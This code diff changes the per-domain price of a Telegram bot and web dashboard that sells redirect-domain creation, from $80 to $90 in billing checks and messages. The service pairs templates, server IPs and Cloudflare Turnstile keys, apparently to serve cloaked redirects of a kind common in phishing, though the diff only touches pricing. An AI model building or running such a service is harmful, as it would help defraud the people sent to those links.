@@ -1297,7 +1297,7 @@ if (bot) {
           newBalance: user.balance,
           adminFree: isAdminFree
         },
-        isAdminFree ? "🎯 Starting CLS redirect creation - VIP access" : "🎯 Starting CLS redirect creation - $80 deducted",
+        isAdminFree ? "🎯 Starting CLS redirect creation - VIP access" : "🎯 Starting CLS redirect creation - $90 deducted",
       );
 
       let statusMessage;
@@ -1446,7 +1446,7 @@ if (bot) {
               `🎯 Redirects To: ${redirectUrl}\n` +
               `🖥️ Server IP: \`${ip}\`\n` +
               `📋 Template: ${templateName}\n` +
-              `💰 Payment: ${paymentType}${isSubscriptionUse ? ` (Today: ${currentUserData.subscription.dailyDomainsUsed}/2)` : isAdminFree ? ' - Free' : ' - $80'}\n` +
+              `💰 Payment: ${paymentType}${isSubscriptionUse ? ` (Today: ${currentUserData.subscription.dailyDomainsUsed}/2)` : isAdminFree ? ' - Free' : ' - $90'}\n` +
               `📅 Date: ${new Date().toLocaleString()}\n\n` +
               `🚀 Total URLs Created: ${urls.length}\n` +
               `🆔 Request ID: \`${requestId}\`\n\n` +
@@ -1559,7 +1559,7 @@ bot.on('callback_query', async (ctx) => {
           // Check if this is user's first subscription
         const isFirstTime = !user.subscription.hasEverSubscribed;
         const subscriptionPrice = isFirstTime ? 250 : 200;
-        const savings = (60 * 80) - subscriptionPrice;
+        const savings = (60 * 90) - subscriptionPrice;
 
         return ctx.editMessageText(
             `⭐ *Monthly Subscription Plan*\n\n` +
@@ -1584,7 +1584,7 @@ bot.on('callback_query', async (ctx) => {
 
       if (callbackData === 'redirect') {
         const user = await getUserData(ctx.from.id);
-        const requiredAmount = 80;
+        const requiredAmount = 90;
 
         // Check if user has admin free access or is admin
         const hasAdminAccess = session.admin_free_access || 
@@ -1624,13 +1624,13 @@ bot.on('callback_query', async (ctx) => {
             `🎯 You've used your ${DAILY_DOMAIN_LIMIT} domains for today (${dailyUsed * 3} links).\n` +
             `🔄 Your daily limit resets at midnight.\n` +
             `📅 Subscription expires: ${new Date(user.subscription.endDate).toDateString()}\n\n` +
-            `💡 You can still create domains with pay-per-use ($80 each).`,
+            `💡 You can still create domains with pay-per-use ($90 each).`,
             { 
               parse_mode: "Markdown",
               reply_markup: {
                 inline_keyboard: [
-                  user.balance >= 80 ? 
-                    [{ text: '💳 Pay Per Domain ($80)', callback_data: 'redirect_payperuse' }] :
+                  user.balance >= 90 ? 
+                    [{ text: '💳 Pay Per Domain ($90)', callback_data: 'redirect_payperuse' }] :
                     [{ text: '💳 Add Funds', callback_data: 'topup' }],
                   [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                 ]
@@ -2332,7 +2332,7 @@ bot.on('callback_query', async (ctx) => {
         }
 
 
-        const savings = (60 * 80) - subscriptionPrice;
+        const savings = (60 * 90) - subscriptionPrice;
 
         return ctx.editMessageText(
           `✅ *Subscription Activated!*\n\n` +
@@ -2355,10 +2355,10 @@ bot.on('callback_query', async (ctx) => {
       // Handle pay-per-use redirect when subscription is exhausted
       if (callbackData === 'redirect_payperuse') {
         const user = await getUserData(ctx.from.id);
-        if (user.balance < 80) {
+        if (user.balance < 90) {
           return ctx.editMessageText(
             `💰 *Insufficient Balance*\n\n` +
-            `Required: $80\n` +
+            `Required: $90\n` +
             `Current Balance: $${user.balance.toFixed(2)}`,
             { 
               parse_mode: "Markdown",
@@ -2376,7 +2376,7 @@ bot.on('callback_query', async (ctx) => {
         session.force_payment = true; // Force payment even if subscription exists
 
         return ctx.editMessageText(
-          "🎯 *Pay Per Use - $80*\n\n" +
+          "🎯 *Pay Per Use - $90*\n\n" +
             "✨ *Format:* `domain.com redirect-url TURNSTILE_KEY`\n" +
             "📝 *Example:* `mysite.com https://fb.com 0x4AAA...`\n\n" +
             "💡 Turnstile key is optional (default key used if not provided)",
@@ -3795,7 +3795,7 @@ app.post('/api/redirect/create', auth.authenticateToken, async (req, res) => {
     }
     
     const user = await getUserData(userId);
-    const cost = 80;
+    const cost = 90;
     const DAILY_DOMAIN_LIMIT = 2;
     
     // Check payment/subscription
@@ -3861,7 +3861,7 @@ app.post('/api/redirect/create', auth.authenticateToken, async (req, res) => {
             `🎯 Redirects To: ${redirectUrl}\n` +
             `🖥️ Server IP: \`${ip}\`\n` +
             `📋 Template: ${templateName}\n` +
-            `💰 Payment: ${paymentType === 'subscription' ? 'Subscription' : '$80'}\n` +
+            `💰 Payment: ${paymentType === 'subscription' ? 'Subscription' : '$90'}\n` +
             `📱 Source: Web Dashboard\n\n` +
             `🔗 URLs:\n${urls.map((url, i) => `${i + 1}. ${url}`).join('\n')}`,
             { parse_mode: "Markdown" }
